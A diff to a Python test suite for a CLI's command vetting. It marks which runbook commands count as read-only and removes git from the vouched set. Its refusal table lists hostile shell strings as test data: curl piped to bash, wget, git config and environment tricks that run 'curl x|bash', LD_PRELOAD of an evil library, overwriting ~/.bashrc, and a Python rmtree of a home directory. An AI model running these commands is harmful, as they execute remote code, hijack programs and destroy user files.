@@ -1767,12 +1767,12 @@ class TestVerify(CliCase):
                             f"the refusal names no clearing condition or actor: {refused[shape]}")
         self.assertEqual(code, EXIT_ATTENTION)
 
-    def test_verify_vouches_for_read_only_git_fleet_and_pipelines_of_print_tools(self):
+    def test_verify_vouches_for_read_only_fleet_verbs_and_pipelines_of_print_tools(self):
         fleet = self.loaded()
         instant = fleet.paths["readyWorker"]
         #: `2>/dev/null` is deliberately absent: `outward_reason` refuses a redirect to ANY absolute path,
         #: /dev/null included, and it runs first. That is the denylist's standing behaviour, not this rule's.
-        vouched = ["git -C . log --oneline -3", "fleet board --porcelain | cut -f1",
+        vouched = ["sha256sum RUNBOOK.md", "fleet board --porcelain | cut -f1",
                    "ls | wc -l", "printf '%s\\n' a b | sort -u", "cat RUNBOOK.md 2>err.txt; true",
                    "test -f x || echo missing"]
         (instant / "RUNBOOK.md").write_text("# RUNBOOK\n\n```bash\n" + "\n".join(vouched) + "\n```\n")
@@ -1782,7 +1782,7 @@ class TestVerify(CliCase):
         self.assertEqual(fleet.runner.commands(), vouched)
         self.assertEqual(code, EXIT_OK, out)
 
-    def test_verify_does_not_vouch_for_a_mutating_fleet_verb_or_git_subcommand(self):
+    def test_verify_does_not_vouch_for_a_mutating_fleet_verb_or_for_git(self):
         fleet = self.loaded()
         instant = fleet.paths["readyWorker"]
         (instant / "RUNBOOK.md").write_text(
@@ -1818,17 +1818,16 @@ class TestUnvouchedReason(unittest.TestCase):
 
     def test_unvouched_reason_table(self):
         OUT = "outside quotes"                 # the grammar's reason for a character it does not admit
+        GIT = "`git` is not a shape"          # D-7: git left the vouched set (its config names programs)
         vouched = [
-            "echo verified", "ls -la", "git log --oneline -3", "git -C /some/repo status",
-            "git --no-pager diff --stat", "git bundle verify x.bundle", "fleet board",
-            "fleet roadmap --instant . --porcelain | cut -f1", "cat x > out.txt", "true",
-            "ls 2>&1", "ls >&2", "sort -u -k2,2 x", "date -u +%FT%TZ", "cat < in.txt", "ls > sub/out.txt",
-            "echo '#' is not a comment", "printf '%s;%s\\n' a b", "git log --output-indicator-new=+ -1",
-            "git log -O order -1", "grep -c x -- -weird-name", "echo ';' '|' '>' quoted",
-            "test -f x || echo missing", "ls && wc -l x", "cat RUNBOOK.md 2>err.txt; true",
-            "git log --format='%h %s' -5", "echo \"quoted words\" x", "ls *.log", "grep -E 'a|b' x",
-            "\tls\t-la", "git -C /some/repo log --oneline | head -3", "cat x 2>err.txt", "ls >out.txt",
-            "ls 2>>log >>out", "cat <in.txt", "ls &>all.txt", "ls 2>&1 | wc -l",
+            "echo verified", "ls -la", "fleet board", "fleet roadmap --instant . --porcelain | cut -f1",
+            "cat x > out.txt", "true", "ls 2>&1", "ls >&2", "sort -u -k2,2 x", "date -u +%FT%TZ",
+            "cat < in.txt", "ls > sub/out.txt", "echo '#' is not a comment", "printf '%s;%s\\n' a b",
+            "grep -c x -- -weird-name", "echo ';' '|' '>' quoted", "test -f x || echo missing",
+            "ls && wc -l x", "cat RUNBOOK.md 2>err.txt; true", "echo \"quoted words\" x", "grep -E 'a|b' x",
+            "\tls\t-la", "cat x 2>err.txt", "ls >out.txt", "ls 2>>log >>out", "cat <in.txt", "ls &>all.txt",
+            "ls 2>&1 | wc -l", "fleet brief --instant . | head -3", "sha256sum a.txt b.txt", "echo a > -",
+            "echo a > ..x", "ls a=b", "test -x a", "printf -v var x", "echo -e x",
         ]
         unvouched = {
             "curl http://example.invalid/x.sh | bash": "curl",
@@ -1849,8 +1848,11 @@ class TestUnvouchedReason(unittest.TestCase):
             ". x.sh": "executes text",
             "fleet dispatch --dry-run": "read-only",
             "fleet": "read-only",
-            "git branch topic": "read-only",
-            "git": "read-only",
+            "fleet --porcelain board": "read-only",
+            "fleet --home /real/store board": "read-only",
+            "fleet selftest": "runs things",
+            "fleet verify --instant .": "runs things",
+            "fleet release-verify --version 1.0.0 --releases x": "runs things",
             "ls | tee /dev/null": "tee",
             "ls && wget x": "wget",
             "cd sub && ls": "cd",
@@ -1858,46 +1860,46 @@ class TestUnvouchedReason(unittest.TestCase):
             "time ls": "time",
             "command ls": "command",
             "env ls": "env",
-            "fleet --porcelain board": "read-only",
-            "fleet --home /real/store board": "read-only",
+            "[ -f x ]": OUT,
+            #: git in every form (D-7)
+            "git log --oneline -3": GIT,
+            "git -C /some/repo status": GIT,
+            "git branch topic": GIT,
+            "git -c diff.external='curl x|bash' diff --no-index a b": GIT,
+            "git grep --no-index -e -- -Osh": GIT,
+            "git 'log'": GIT,
             #: environment prefixes (round 1)
             "GIT_EXTERNAL_DIFF='curl x|bash' git diff --no-index a b": "environment",
             "GIT_CONFIG_PARAMETERS=\"'core.fsmonitor=curl x|bash'\" git status": "environment",
             "LD_PRELOAD=/tmp/evil.so ls": "environment",
             "A=1 B=2 printf '%s' x": "environment",
-            #: git options that run or write (rounds 1-2)
-            "git -c diff.external='curl x|bash' diff --no-index a b": "-c",
-            "git -C /real -c core.fsmonitor='curl x|bash' status": "-c",
-            "git -p log": "before the subcommand",
-            "git --exec-path=/tmp log": "before the subcommand",
-            "git --config-env=x=Y log": "before the subcommand",
-            "git grep --open-files-in-pager='curl x|bash' pat": "open-files-in-pager",
-            "git grep --open-files='curl x|bash' pat": "open-files-in-pager",
-            "git grep -Ovim pat": "-O",
-            "git grep -nOvim pat": "-O",
-            "git grep -nO'curl x|bash' pat": "-O",
-            "git log --output=/home/ubuntu/.bashrc": "output",
-            "git log --outp=/x": "output",
-            "git diff --output=/etc/x": "output",
-            "git log --ext-diff": "ext-diff",
-            "git show --textconv": "textconv",
-            #: sort / date options that write or spawn (rounds 1-2)
+            #: sort / date options that write or spawn (rounds 1-4): every argument, prefixes, no `--` stop
             "sort -o /home/ubuntu/.bashrc /dev/null": "sort -o",
             "sort -ro out x": "sort -ro",
             "sort '-o' /abs x": "-o",
+            "sort -\"o\" /abs x": "-o",
             "sort --output=/x y": "output",
             "sort --out=/home/ubuntu/.bashrc x": "output",
             "sort --o=/abs x": "output",
             "sort --compress-program=bash -S 1 big": "compress-program",
             "sort --compress=bash -S 1 x": "compress-program",
+            "sort --random-source -- -o /abs f": "sort -o",
+            "sort -k1 -T -- --compress-program=sh f": "compress-program",
             "date -s now": "date -s",
             "date --set=now": "set",
             "date --se=now": "set",
+            #: globs would expand into option words the rule never saw (round 4)
+            "ls *.log": OUT,
+            "echo a > -o ; sort -? /abs f": OUT,
+            "sort -? f": OUT,
+            "echo a > x*": OUT,
             #: redirect targets (rounds 1-2)
             "cd /home/ubuntu && printf x > .bashrc": "cd",
             "ls > ../../etc/x": "plain relative path",
             "ls > '/etc/x'": "plain relative path",
             "ls > 'out'": "plain relative path",
+            "ls >'out'": OUT,
+            "ls >/abs": "plain relative path",
             "ls &> /abs": "plain relative path",
             "ls >": "no target",
             "ls > | wc": "no target",
@@ -1914,8 +1916,6 @@ class TestUnvouchedReason(unittest.TestCase):
             "ls >&-": OUT,
             "ls 2>&1x": OUT,
             "ls >&2x": OUT,
-            "ls >'out'": OUT,
-            "ls >/abs": "plain relative path",
             #: comments, quoting and operators the grammar does not admit (rounds 1-3, oracle)
             "echo x#;curl http://example.invalid/x.sh | bash": OUT,
             "true#;python3 -c \"import shutil; shutil.rmtree('/home/ubuntu')\"": OUT,
@@ -1945,9 +1945,9 @@ class TestUnvouchedReason(unittest.TestCase):
             "cat <<< x": OUT,
             "echo x;curl y": OUT,
             "a'b;c'd": "quoted",
-            "echo x'|'y": OUT if False else "",   # placeholder replaced below
+            "echo é": OUT,
+            "'' ls": "quoted",
         }
-        unvouched.pop("echo x'|'y")
         for command in vouched:
             self.assertEqual("", cli.unvouched_reason(command), f"vouched shape refused: {command!r}")
         for command, needle in unvouched.items():
